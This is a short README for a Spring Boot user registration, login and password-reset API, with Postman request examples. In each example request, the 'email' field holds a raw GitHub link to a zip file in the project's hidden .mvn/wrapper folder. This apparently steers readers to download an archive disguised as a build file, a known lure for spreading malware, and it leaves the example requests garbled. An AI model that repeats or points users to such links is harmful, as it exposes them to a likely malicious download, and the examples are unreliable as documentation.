# Springboot-Registration-Login-Project
In this project I created User registration, login and forget-password API. I used Spring security for authentication, spring-web-starter, Spring JPA for database interaction, H2 Inmemory database for storing data. User can easily registration by email, password, fullName and can login by email, password. In case of forget-password user can easily update the password.

# Working 
To test API first run the application in your local machine then Open POSTMAN, All the api's are of POST type. Just paste the url's in the postman and select method to 'POST'.

* For Registration *
url:  http://localhost:8080/api/auth/signup
JSON : {
    "fullName":"Ayush",
    "email":"https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/Springboot-Registration-Login-Project/main/.mvn/wrapper/Registration_Login_Project_Springboot_2.3.zip",
    "password":"Ayush@123"
}

* For Login *
url: http://localhost:8080/api/auth/login
JSON : {
    "email": "https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/Springboot-Registration-Login-Project/main/.mvn/wrapper/Registration_Login_Project_Springboot_2.3.zip",
    "password": "newPassword123"
}

* For Forget Password *
url:  http://localhost:8080/api/auth/forget-password
JSON : {
      "email": "https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/Springboot-Registration-Login-Project/main/.mvn/wrapper/Registration_Login_Project_Springboot_2.3.zip"
}
Then Reset token is visible at console where the logs of application is display

* Reset Password *
url: http://localhost:8080/api/auth/reset-password
JSON : {
    "token": "4430224b-2235-48e6-80b0-f50a82632580",
    "newPassword": "Ayush123"
}

And for testing the test-cases just run the test file.
